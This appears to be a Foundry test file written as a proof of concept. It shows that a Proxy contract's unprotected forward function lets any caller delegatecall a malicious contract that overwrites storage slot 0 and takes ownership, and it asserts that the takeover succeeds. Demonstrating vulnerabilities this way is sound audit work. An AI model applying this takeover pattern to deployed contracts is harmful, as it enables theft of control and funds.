
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Proxy} from "../src/Proxy.sol";

// Malicious contract that will be called via delegatecall to take over ownership
contract MaliciousOwnerTakeover {
    // Storage slot 0 matches the owner slot in Proxy contract
    address owner;
    
    function takeOwnership() external {
        owner = msg.sender;
    }
}

contract TestAccessControlProxy is Test {
    Proxy public proxy;
    MaliciousOwnerTakeover public malicious;
    address public originalOwner;

    function setUp() public {
        originalOwner = address(this);
        proxy = new Proxy();
        malicious = new MaliciousOwnerTakeover();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the original owner (the deployer/test contract)
        // The owner is set in constructor to msg.sender which is this test contract
        vm.assume(caller != originalOwner);

        // --- 2. State Configuration ---
        // No special state configuration needed for this test
        // The forward function doesn't require any value or special state

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Prepare the malicious delegatecall data
        bytes memory maliciousData = abi.encodeWithSelector(
            MaliciousOwnerTakeover.takeOwnership.selector
        );

        // Call the unprotected forward function
        // This should succeed even though caller is not the owner
        // demonstrating the vulnerability
        proxy.forward(address(malicious), maliciousData);

        // Verify the attack succeeded - the owner should now be the caller
        // Read the owner from storage slot 0
        bytes32 newOwnerSlot = vm.load(address(proxy), bytes32(uint256(0)));
        address newOwner = address(uint160(uint256(newOwnerSlot)));
        
        // Assert that the arbitrary caller has taken ownership
        assertEq(newOwner, caller, "Arbitrary user should have taken ownership via delegatecall");
    }
}

// Simple helper contract for testing
contract SimpleTarget {
    fallback() external {}
}
